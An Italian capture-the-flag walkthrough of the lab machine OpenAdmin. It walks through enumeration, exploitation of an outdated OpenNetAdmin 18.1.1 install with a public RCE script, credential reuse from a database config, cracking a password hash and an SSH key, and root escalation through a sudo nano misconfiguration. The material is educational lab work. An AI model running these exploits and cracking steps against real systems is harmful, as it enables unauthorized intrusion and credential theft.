---
title: OpenAdmin Walkthrough
description: "OpenAdmin è una macchina Linux di difficoltà easy che presenta un'istanza CMS OpenNetAdmin obsoleta. Il CMS viene exploitato per ottenere un foothold, e la successiva enumeration rivela le credenziali del database. Queste credenziali vengono riutilizzate per effettuare un movimento laterale verso un utente con privilegi limitati. Si scopre che questo utente ha accesso a un'applicazione interna ristretta. L'esame di questa applicazione rivela credenziali che vengono utilizzate per spostarsi lateralmente verso un secondo utente. Viene quindi exploitata una misconfiguration di sudo per ottenere una shell root."
author: dua2z3rr
date: 2025-12-09 1:00:00
categories: [Machines]
tags: [""]
image: /assets/img/openAdmin/openAdmin-resized.png
---

## Enumerazione Esterna

### nmap

```shell
┌─[dua2z3rr@parrot]─[~]
└──╼ $nmap openadmin.htb -vv -p- -sC -sV
<SNIP>
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 4b:98:df:85:d1:7e:f0:3d:da:48:cd:bc:92:00:b7:54 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCcVHOWV8MC41kgTdwiBIBmUrM8vGHUM2Q7+a0LCl9jfH3bIpmuWnzwev97wpc8pRHPuKfKm0c3iHGII+cKSsVgzVtJfQdQ0j/GyDcBQ9s1VGHiYIjbpX30eM2P2N5g2hy9ZWsF36WMoo5Fr+mPNycf6Mf0QOODMVqbmE3VVZE1VlX3pNW4ZkMIpDSUR89JhH+PHz/miZ1OhBdSoNWYJIuWyn8DWLCGBQ7THxxYOfN1bwhfYRCRTv46tiayuF2NNKWaDqDq/DXZxSYjwpSVelFV+vybL6nU0f28PzpQsmvPab4PtMUb0epaj4ZFcB1VVITVCdBsiu4SpZDdElxkuQJz
|   256 dc:eb:3d:c9:44:d1:18:b1:22:b4:cf:de:bd:6c:7a:54 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBHqbD5jGewKxd8heN452cfS5LS/VdUroTScThdV8IiZdTxgSaXN1Qga4audhlYIGSyDdTEL8x2tPAFPpvipRrLE=
|   256 dc:ad:ca:3c:11:31:5b:6f:e6:a4:89:34:7c:9b:e5:50 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBcV0sVI0yWfjKsl7++B9FGfOVeWAIWZ4YGEMROPxxk4
80/tcp open  http    syn-ack Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### Sito

Sul sito troviamo la pagina della installazione di default di apache2 ubuntu.

![Desktop View](/assets/img/openAdmin/openAdmin-1.png)

### ffuf

```shell
┌─[dua2z3rr@parrot]─[~]
└──╼ $ffuf -w SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-big.txt -u http://openadmin.htb/FUZZ -ic

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://openadmin.htb/FUZZ
 :: Wordlist         : FUZZ: /home/dua2z3rr/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-big.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

                        [Status: 200, Size: 10918, Words: 3499, Lines: 376, Duration: 56ms]
music                   [Status: 301, Size: 314, Words: 20, Lines: 10, Duration: 47ms]
artwork                 [Status: 301, Size: 316, Words: 20, Lines: 10, Duration: 73ms]
sierra                  [Status: 301, Size: 315, Words: 20, Lines: 10, Duration: 70ms]
```

### Directory music

![Immagine Homepage directory music](/assets/img/openAdmin/openAdmin-2.png)

Cliccando sul pulsante di login veniamo reindirizzatri a un'altra directory, **ona**.

![Immagine Homepage directory ona](/assets/img/openAdmin/openAdmin-3.png)

Su questa pagina possiamo vedere la versione di ONA (OpenNetAdmin) v18.1.1.

### Ricerca Exploit ONA

Prima di tutto cerco se c'è un modulo esistente su msfconsole.

```shell
[msf](Jobs:0 Agents:0) >> search OpenNetAdmin

Matching Modules
================

   #  Name                                                 Disclosure Date  Rank       Check  Description
   -  ----                                                 ---------------  ----       -----  -----------
   0  exploit/unix/webapp/opennetadmin_ping_cmd_injection  2019-11-19       excellent  Yes    OpenNetAdmin Ping Command Injection


Interact with a module by name or index. For example info 0, use 0 or use exploit/unix/webapp/opennetadmin_ping_cmd_injection

[msf](Jobs:0 Agents:0) >> use 0
[*] Using configured payload linux/x86/meterpreter/reverse_tcp
[msf](Jobs:0 Agents:0) exploit(unix/webapp/opennetadmin_ping_cmd_injection) >> info

       Name: OpenNetAdmin Ping Command Injection
     Module: exploit/unix/webapp/opennetadmin_ping_cmd_injection
   Platform: Linux
       Arch: x86, x64
 Privileged: No
    License: Metasploit Framework License (BSD)
       Rank: Excellent
  Disclosed: 2019-11-19

Provided by:
  mattpascoe
  Onur ER <onur@onurer.net>

Module side effects:
 unknown-side-effects

Module stability:
 unknown-stability

Module reliability:
 unknown-reliability

Available targets:
      Id  Name
      --  ----
  =>  0   Automatic Target

Check supported:
  Yes

Basic options:
  Name       Current Setting  Required  Description
  ----       ---------------  --------  -----------
  Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]. Supported proxies: socks4, socks5, sapni, socks5h, http
  RHOSTS                      yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
  RPORT      80               yes       The target port (TCP)
  SSL        false            no        Negotiate SSL/TLS for outgoing connections
  SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
  TARGETURI  /ona/login.php   yes       Base path
  URIPATH                     no        The URI to use for this exploit (default is random)
  VHOST                       no        HTTP server virtual host


  When CMDSTAGER::FLAVOR is one of auto,tftp,wget,curl,fetch,lwprequest,psh_invokewebrequest,ftp_http:

  Name     Current Setting  Required  Description
  ----     ---------------  --------  -----------
  SRVHOST  0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
  SRVPORT  8080             yes       The local port to listen on.

Payload information:

Description:
  This module exploits a command injection in OpenNetAdmin between 8.5.14 and 18.1.1.

References:
  https://www.exploit-db.com/exploits/47691


View the full module info with the info -d command.
```

La versione 18.1.1 è vulnerabilile. Tuttavia, l'exploit non funziona. Dunque, uso searchsploit per cercare altre vuon e ne trovo un'altra.

```shell
┌─[✗]─[dua2z3rr@parrot]─[~]
└──╼ $searchsploit OpenNetAdmin
------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                                                                                              |  Path
------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
OpenNetAdmin 13.03.01 - Remote Code Execution                                                                                                               | php/webapps/26682.txt
OpenNetAdmin 18.1.1 - Command Injection Exploit (Metasploit)                                                                                                | php/webapps/47772.rb
OpenNetAdmin 18.1.1 - Remote Code Execution                                                                                                                 | php/webapps/47691.sh
------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results
┌─[dua2z3rr@parrot]─[~]
└──╼ $find / 2>/dev/null | grep 47691.sh
/snap/searchsploit/542/opt/exploitdb/exploits/php/webapps/47691.sh
```

### Exploit

Con questo exploit otteniamo una shell.

```bash
┌─[dua2z3rr@parrot]─[~]
└──╼ $/snap/searchsploit/542/opt/exploitdb/exploits/php/webapps/47691.sh http://10.10.10.171/ona/
$ whoami
www-data
```

Nel file config/config.inc.php trovo la posizione del file di configurazione del database. Leggiamolo.

```bash

<SNIP>
require_once($conf['inc_functions_db']);
$dbconffile = "{$base}/local/config/database_settings.inc.php";
if (file_exists($dbconffile)) {
<SNIP>

$ cat local/config/database_settings.inc.php    
<?php

$ona_contexts=array (
  'DEFAULT' => 
  array (
    'databases' => 
    array (
      0 => 
      array (
        'db_type' => 'mysqli',
        'db_host' => 'localhost',
        'db_login' => 'ona_sys',
        'db_passwd' => 'n1nj4W4rri0R!',
        'db_database' => 'ona_default',
        'db_debug' => false,
      ),
    ),
    'description' => 'Default data context',
    'context_color' => '#D3DBFF',
  ),
);
```

Troviamo la password: **n1nj4W4rri0R!**. 

Enumeriamo gli user.

```sh
$ ls /home
jimmy
joanna
```

Questa password ci permette di autenticarci all'account jimmy.

## Shell come jimmy

### Enumerazione Interna

Controllo se possso eseguire binaries come sudo

```sh
jimmy@openadmin:~$ sudo -l
[sudo] password for jimmy: 
Sorry, user jimmy may not run sudo on openadmin.
```

Non posso, controllo se ci sono porte solo in localhost.

```sh
jimmy@openadmin:~$ netstat -ln
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State      
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN     
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.1:52846         0.0.0.0:*               LISTEN     
tcp6       0      0 :::80                   :::*                    LISTEN     
tcp6       0      0 :::22                   :::*                    LISTEN     
udp        0      0 127.0.0.53:53           0.0.0.0:*                          
Active UNIX domain sockets (only servers)
Proto RefCnt Flags       Type       State         I-Node   Path
unix  2      [ ACC ]     SEQPACKET  LISTENING     13290    /run/udev/control
unix  2      [ ACC ]     STREAM     LISTENING     37732    /run/user/1000/systemd/private
unix  2      [ ACC ]     STREAM     LISTENING     37736    /run/user/1000/gnupg/S.gpg-agent.browser
unix  2      [ ACC ]     STREAM     LISTENING     37737    /run/user/1000/gnupg/S.dirmngr
unix  2      [ ACC ]     STREAM     LISTENING     37738    /run/user/1000/gnupg/S.gpg-agent
unix  2      [ ACC ]     STREAM     LISTENING     37739    /run/user/1000/gnupg/S.gpg-agent.ssh
unix  2      [ ACC ]     STREAM     LISTENING     37740    /run/user/1000/gnupg/S.gpg-agent.extra
unix  2      [ ACC ]     STREAM     LISTENING     18958    @irqbalance855.sock
unix  2      [ ACC ]     STREAM     LISTENING     13280    /run/systemd/private
unix  2      [ ACC ]     STREAM     LISTENING     13285    /run/systemd/journal/stdout
unix  2      [ ACC ]     STREAM     LISTENING     15110    /var/run/vmware/guestServicePipe
unix  2      [ ACC ]     STREAM     LISTENING     13304    /run/lvm/lvmetad.socket
unix  2      [ ACC ]     STREAM     LISTENING     17396    /run/snapd.socket
unix  2      [ ACC ]     STREAM     LISTENING     17428    /var/run/dbus/system_bus_socket
unix  2      [ ACC ]     STREAM     LISTENING     14338    /run/lvm/lvmpolld.socket
unix  2      [ ACC ]     STREAM     LISTENING     17433    /var/lib/lxd/unix.socket
unix  2      [ ACC ]     STREAM     LISTENING     17430    /run/acpid.socket
unix  2      [ ACC ]     STREAM     LISTENING     17435    /run/uuidd/request
unix  2      [ ACC ]     STREAM     LISTENING     17398    /run/snapd-snap.socket
unix  2      [ ACC ]     STREAM     LISTENING     22566    /var/run/mysqld/mysqld.sock
unix  2      [ ACC ]     STREAM     LISTENING     17432    @ISCSIADM_ABSTRACT_NAMESPACE
```

C'è una porta in ascolto su la porta **52846**. Utilizzo il port forwarding di ssh con il comando: `ssh jimmy@10.10.10.171 -L 8080:localhost:52846`

### Sito

![Homepage del nuovo sito](/assets/img/openAdmin/openadmin-4.png)

Il codice sorgente della pagina non ci aiuta.

Se torniamo sulla  nostra shell, possiamo cercare il codice sorgente del sito. Questo contiene 3 file:

```sh
jimmy@openadmin:/var/www/internal$ ls -al
total 20
drwxrwx--- 2 jimmy internal 4096 Dec  9 20:50 .
drwxr-xr-x 4 root  root     4096 Nov 22  2019 ..
-rwxrwxr-x 1 jimmy internal 3229 Nov 22  2019 index.php
-rwxrwxr-x 1 jimmy internal  185 Nov 23  2019 logout.php
-rwxrwxr-x 1 jimmy internal  339 Nov 23  2019 main.php
```

index.php è il codice sorgente che abbiamo letto prima. Il file main.php contiene invece una informazione importante.

```php
<?php session_start(); if (!isset ($_SESSION['username'])) { header("Location: /index.php"); }; 
# Open Admin Trusted
# OpenAdmin
$output = shell_exec('cat /home/joanna/.ssh/id_rsa');
echo "<pre>$output</pre>";
?>
<html>
<h3>Don't forget your "ninja" password</h3>
Click here to logout <a href="logout.php" tite = "Logout">Session
</html>
```

Le credenziali **Joanna:ninja** e **Jimmy:ninja** non funzionano (con anche le minuscole come prima lettera). Allora provo un bruteforce.

Provo sqlmap e hydra senbza successo. Quindi ricontrollo i file e scopro che su index.php c'è anche un hash hardcoded.

```php
<?php
   ob_start();
   session_start();
?>

<?
   // error_reporting(E_ALL);
   // ini_set("display_errors", 1);
?>

<html lang = "en">

   <head>
      <title>Tutorialspoint.com</title>
      <link href = "css/bootstrap.min.css" rel = "stylesheet">

      <style>
         body {
            padding-top: 40px;
            padding-bottom: 40px;
            background-color: #ADABAB;
         }

         .form-signin {
            max-width: 330px;
            padding: 15px;
            margin: 0 auto;
            color: #017572;
         }

         .form-signin .form-signin-heading,
         .form-signin .checkbox {
            margin-bottom: 10px;
         }

         .form-signin .checkbox {
            font-weight: normal;
         }

         .form-signin .form-control {
            position: relative;
            height: auto;
            -webkit-box-sizing: border-box;
            -moz-box-sizing: border-box;
            box-sizing: border-box;
            padding: 10px;
            font-size: 16px;
         }

         .form-signin .form-control:focus {
            z-index: 2;
         }

         .form-signin input[type="email"] {
            margin-bottom: -1px;
            border-bottom-right-radius: 0;
            border-bottom-left-radius: 0;
            border-color:#017572;
         }

         .form-signin input[type="password"] {
            margin-bottom: 10px;
            border-top-left-radius: 0;
            border-top-right-radius: 0;
            border-color:#017572;
         }

         h2{
            text-align: center;
            color: #017572;
         }
      </style>

   </head>
   <body>

      <h2>Enter Username and Password</h2>
      <div class = "container form-signin">
        <h2 class="featurette-heading">Login Restricted.<span class="text-muted"></span></h2>
          <?php
            $msg = '';

            if (isset($_POST['login']) && !empty($_POST['username']) && !empty($_POST['password'])) {
              if ($_POST['username'] == 'jimmy' && hash('sha512',$_POST['password']) == '00e302ccdcf1c60b8ad50ea50cf72b939705f49f40f0dc658801b4680b7d758eebdc2e9f9ba8ba3ef8a8bb9a796d34ba2e856838ee9bdde852b8ec3b3a0523b1') {
                  $_SESSION['username'] = 'jimmy';
                  header("Location: /main.php");
              } else {
                  $msg = 'Wrong username or password.';
              }
            }
         ?>
      </div> <!-- /container -->

      <div class = "container">

         <form class = "form-signin" role = "form"
            action = "<?php echo htmlspecialchars($_SERVER['PHP_SELF']);
            ?>" method = "post">
            <h4 class = "form-signin-heading"><?php echo $msg; ?></h4>
            <input type = "text" class = "form-control"
               name = "username"
               required autofocus></br>
            <input type = "password" class = "form-control"
               name = "password" required>
            <button class = "btn btn-lg btn-primary btn-block" type = "submit"
               name = "login">Login</button>
         </form>

      </div>

   </body>
</html>
```

### hashcat

Con la wordlist rockyou.txt non facciamo progressi. allora utilizzo il tool online crackstation e ottengo la password Revealed.

![Crackstation](/assets/img/openAdmin/openAdmin-5.png)

Otteniamo la chiave privata di joanna. Tuttavia questa è criptata, e dobbiamo decriptarla. Possiamo usare il tool ssh2john e poi usare john per ottenere la password.

![Chiave privata](/assets/img/openAdmin/openAdmin-6.png)

```sh
┌─[dua2z3rr@parrot]─[~]
└──╼ $ssh2john rsa > hash.txt
┌─[dua2z3rr@parrot]─[~]
└──╼ $john hash.txt --wordlist=rockyou.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
bloodninjas      (rsa)     
1g 0:00:00:02 DONE (2025-12-09 22:48) 0.3968g/s 3799Kp/s 3799Kc/s 3799KC/s bloodofyouth..bloodmabite
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

La password è **bloodninjas**.

Prendiamo la user flag.

## Shell come joanna

### Privilege Escalation

Possiamo eseguire come root `sudo /bin/nano /opt/priv`.

```sh
joanna@openadmin:/opt$ sudo -l
Matching Defaults entries for joanna on openadmin:
    env_keep+="LANG LANGUAGE LINGUAS LC_* _XKB_CHARSET", env_keep+="XAPPLRESDIR XFILESEARCHPATH XUSERFILESEARCHPATH",
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, mail_badpass

User joanna may run the following commands on openadmin:
    (ALL) NOPASSWD: /bin/nano /opt/priv
```

Dentro a nano ci basterà fare CTRL+R e CTRL+X per eseguire un comando come root. Possiamo direttamente ottenere una reverse sshell o leggere la root flag. Informazioni del genere possono essere trovate sul sito GTFOBins. ù

Leggiamo la root flag e terminiamo la box.
